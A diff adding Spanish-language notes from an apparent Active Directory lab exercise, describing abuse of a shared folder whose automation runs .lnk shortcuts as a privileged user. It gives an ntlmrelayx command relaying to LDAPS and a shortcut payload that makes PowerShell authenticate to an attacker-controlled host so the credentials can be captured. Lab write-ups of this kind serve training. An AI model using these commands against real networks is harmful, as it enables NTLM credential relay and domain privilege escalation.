@@ -278,4 +278,14 @@ Get-DomainGPO -Identity 'DevOps Policy'
 En el primer laboratorio tras la enumeración descubrimos un recurso compartido en dcorp-ci llamado AI, nos aprovecharemos de este.
 Accedemos al archivo compartido a través de la ruta `\\dcorp-ci\AI`, aquí encontramos un archivo con logs.
 Leyendo el archivo comprendemos que esta ruta se usa para una automatización la cual ejecuta automáticamente accesos directos (Archivos .lnk) como usuario devopsadmin, este usuario se encuentra en la enumeración hecha con BloodHound que tiene activo WriteDACL sobre la política DevOps.
-Vamos a aprovecharnos de esto usando 
+Vamos a aprovecharnos de esto usando *GPOddity*
+En primer lugar tendremos que usar *ntlmrelayx* que la ejecutaremos en la maquina WSL Ubuntu para obtener las credenciales del usuario devopsadmin
+```shell
+sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.97 --http-port '80,8080' -i --no-smb-server
+```
+
+Una vez ejecutado en nuestra maquina virtual deberemos de crear en la ruta de AD\Tools un acceso directo con el siguiente payload
+```shell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.97' -UseDefaultCredentials"
+```
+
